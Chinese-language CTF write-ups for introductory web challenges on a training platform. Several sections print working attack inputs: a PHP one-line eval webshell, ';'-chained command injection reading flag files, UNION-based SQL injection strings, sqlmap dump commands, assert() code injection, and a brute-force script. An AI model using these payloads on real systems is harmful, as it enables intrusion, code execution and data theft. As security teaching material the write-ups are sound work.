# web

## 0x01 查看源代码

鼠标右键被禁止，通过F12开发者工具查看，flag写在html注释里。

## 0x02 GET_POST

### HTTP协议的八种方法

1. GET：向特定的资源发出请求。
1. POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。
1. OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送`*`的请求来测试服务器的功能性。
1. HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。
1. PUT：向指定资源位置上传其最新内容。
1. DELETE：请求服务器删除Request-URI所标识的资源。
1. TRACE：回显服务器收到的请求，主要用于测试或诊断。
1. CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。

### 获取flag

!!! success "工具"
    火狐浏览器插件hackbar: <https://addons.mozilla.org/zh-CN/firefox/addon/hackbar-quantum/?src=search>

1. 使用GET方法提交参数：`http://111.198.29.45:59720/?a=1`
1. 使用POST方法提交参数：勾选`Enable Post Data`，输入`b=2`，get the flag

## 0x03 robots

1. 在URL后添加`robots.txt`访问robots文件
1. 发现隐藏`flag_ls_h3re.php`，访问获取flag

!!! success "工具"
    [扫目录脚本dirsearch](https://github.com/maurosoria/dirsearch)，执行命令：`python3 dirsearch.py -u http://111.198.29.45:52431 -e *`

## 0x04 备份文件

### 常用备份文件名称

- index.php.save
- index.php.bak
- index.old
- index.php.temp
- .git .svn .swp .svn .~ .bak .bash_history

### flag

使用`index.php.bak`下载备份文件，查看源码，get the flag。

## 0x05 cookie

查看cookie，根据提示访问cookie.php，查看响应头，get the flag。

## 0x06 不能按的按钮

编辑源码将input的disable属性删除，点击按钮get the flag。

!!! info "提示"
    手动使用hackbar post数据，提交表单。

## 0x07 js

F12查看源代码，找到页面中的javascript代码。

!!! note "说明"
    javascript中`String.fromCharCode`方法将指定的Unicode转换成字符串，如：`String.fromCharCode(70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65)`

函数中默认的pass为70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65，转换后的值是FAUX PASSWORD HAHA

```python
#!/usr/bin/python

# 将16进制编码输出为ASCII字符
s='\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30'
print(s)
# 55,56,54,79,115,69,114,116,107,49,50

# 构造成列表
slist=[55,56,54,79,115,69,114,116,107,49,50]
for i in slist:
    print(chr(i), end='')  # 输出字符形式
# 786OsErtk12
```

## 0x08_xff_referer

- X-Forwarded-For: 123.123.123.123, 简称XFF, 在通过http代理或负载均衡服务器时, 添加该项代表客户端真实IP.
- Referer: https://www.google.com, 请求链接所属页面地址.

> 这两个值都可以伪造.

???+ tip
    使用 **Burp Suite** 拦截修改时, 直接在`Raw`中添加无效, 需要在`Headers`中点击`Add`添加.

## 0x09_weak_auth

> 提示弱密码, 登录表单无验证码, 攻击思路: 暴力破解

使用`Burp Suite`拦截登录请求, 发送到`Intruder`, Attack type设置为`Sniper`, 添加占位符到`password`参数, Payload set 1选择Payload type为`Simple list`, 下载[弱密码字典](https://github.com/rootphantomer/Blasting_dictionary), Load到Payload Options中, 点击右上角`Start attack`.

- Sniper: 使用单个payload set, 对每个占位符轮流设置值.
- Battering ram: 使用单个payload set, 同时将所有占位符设置为同一个payload.
- Pitchfork: 使用多个payload set, 多个相关联的集合同时迭代.
- Cluster bomb: 使用多个payload set, 固定第一个payload迭代第二个payload set.

迭代到`123456`发现response的Length不同, 查看发现已登录成功, get flag.

## 0x0A_webshell

php代码把POST请求中的参数`shell`作为eval执行, 即可控制`shell`参数调用`system()`执行系统命令, 因此通过`HackBar`插件, 发送POST请求, 并将`shell`参数设置为`system('id')`执行返回`uid=33(www-data) gid=33(www-data) groups=33(www-data)`, 说明执行成功, 继续设置为`system('ls')`执行返回`flag.txt index.php`, 说明该目录下存在`flag.txt`, 继续设置为`system('cat flag.txt')`执行返回flag.

???+ danger "POC"
    存在上传漏洞的web应用中, 上传一句话webshell: `<?php @eval($_POST['shell']); ?>`, 然后通过蚁剑拿到shell.

???+ success "工具"
    - [蚁剑AntSword](https://github.com/AntSwordProject/antSword/releases), webshell管理工具.
    - [快速入门](https://doc.u0u.us/zh-hans/getting_started/index.html)

## 0x0B_command_execution

输入IP地址`1.1.1.1`, 返回命令执行结果:  
```
ping -c 3 1.1.1.1
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.

--- 1.1.1.1 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2004ms
```

说明将用户输入的IP地址拼接到`ping -c 3 `后面执行, 构造命令分隔符`1.1.1.1;id`输入并执行, 返回`uid=33(www-data) gid=33(www-data) groups=33(www-data)`, 继续执行`1.1.1.1;ls`, 发现只有一个`index.php`, 执行`1.1.1.1;find / -name "*flag*"`, 查找到flag在`/home/flag.txt`, 执行`1.1.1.1;cat /home/flag.txt`拿到flag.

???+ example "其他命令拼接符"
    - `|`, 将前一个命令的结果作为后一个命令的输入
    - `&&`, 前一个命令执行成功后执行后一个命令

## 0x0C_simple_php

通过控制GET参数`a=a&b=1235a`显示flag.

## 001_Cat

## 001_ics-06

只有`报表中心`菜单可以跳转到`index.php`, 选择日期点确认没有反应, 查看源码, cookie未果.

URL中自动携带参数`id=1`, 将`id=1`改成`id=flag`, 自动跳回到`id=1`, 改成`id=2`, 不会自动跳转, 但内容无变化.

暴力破解, `Payload set 1`的`Payload type`选择`Numbers`, 范围从`0`到`9999`.

???+ tip
    使用社区版的Burp Suite暴力破解线程被限制为1, 速度太慢, 自己写python脚本.

    ```python
    import requests
    import time

    start = time.time()
    for i in range(2300, 3000):  # 不浪费时间, 从2000开始
        print("time cost %d, i is %d" % (time.time()-start, i))
        r = requests.get("http://111.198.29.45:43813/index.php?id=%d" % i)
        r.encoding = "utf-8"
        reslen = len(r.text)
        if reslen != 1545:  # 正常响应长度是1545
            print(reslen)
            print(r.text)
            break
    ```

## 002_NewsCenter

1. 提交表单发送请求, 参数`search`可控, 使用`flag' or 1=1 -- `测试存在SQL注入
1. 使用`' union select 1,2,3 #`测试出存在3列
1. 使用`' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #`查询出数据库名news, 表名news, secret_table
1. 使用`' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='news'#`查询出列名和数据类型id, int, title, varchar, content, text
1. 使用`' and 0 union select id,title,content from news #`查询news表发现没用
1. 使用`' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#`查询列名和数据类型id, int, fl4g, varchar
1. 使用`' and 0 union select 1,id,fl4g from secret_table #`拿到flag

???+ success "工具"
    [sqlmap](http://sqlmap.org/): 自动化SQL注入工具

    1. 测试数据库类型及是否存在注入, 获取列数`python3 sqlmap.py -u "http://111.198.29.45:53232/index.php" --data "search=df"`
    1. 获取数据库名称`python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" --dbs`
    1. 获取指定数据库表名称`python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" -D news --tables`
    1. 获取表内字段信息`python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" -D news -T secret_table --columns`
    1. 获取字段内容，得到flag: `python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" -D news -T secret_table -C fl4g --dump`

    参考链接: <https://github.com/sqlmapproject/sqlmap/wiki/Usage>

## 003_mfw

整个web没有输入, Cookies中无内容, 无robots.txt, 只在URL中有个page参数, 查看源码, 发现注释中存在`page=flag`但是被注释掉

题目提示使用`Git`, `PHP`, `Bootstrap`, 访问`.git`存在源码泄露

???+ success "工具"
    [GitHack](https://github.com/lijiejie/GitHack): 利用.git源码泄露还原工程代码

    ```bash
    # 使用python 2执行
    python /Users/lixiaolong/tools/GitHack/GitHack.py http://111.198.29.45:54372/.git/
    ```

审计源码发现`flag.php`内容为

```
// TODO
// $FLAG = '';
```

说明flag在该文件中, 但是git应该不是最新的代码, `index.php`中使用`assert()`对`$page`校验`..`, 存在命令执行漏洞.

```php
<?php
$a = "abc";
// abc, 字符串携带变量作为方法参数, 会被php语法解析
echo "<p>$a</p>";
// 1, 获取字符串第一次出现的位置
echo strpos($a, 'bc');
echo "<br>";
// 1, eval把字符串当做代码执行, 字符串中的变量同样会被解析
// 被解析后需要加上''
eval("echo strpos('$a', 'bc');");
echo "<br>";
// assert也会把字符串当做代码执行, 字符串中的变量同样会被解析
assert("strpos('$a', 'bc') === 1");
echo "<p>ok</p>";
// 构造恶意字符串, 截断''
$a = "'.system('ls').'";
assert("strpos('$a', 'bc') === 1");
?>
```

构造输入`?page='.system("cat templates/flag.php").'`, 获取到最新的flag.php源码, 该内容被浏览器作为php解析, 所以查看源码, 拿到flag.
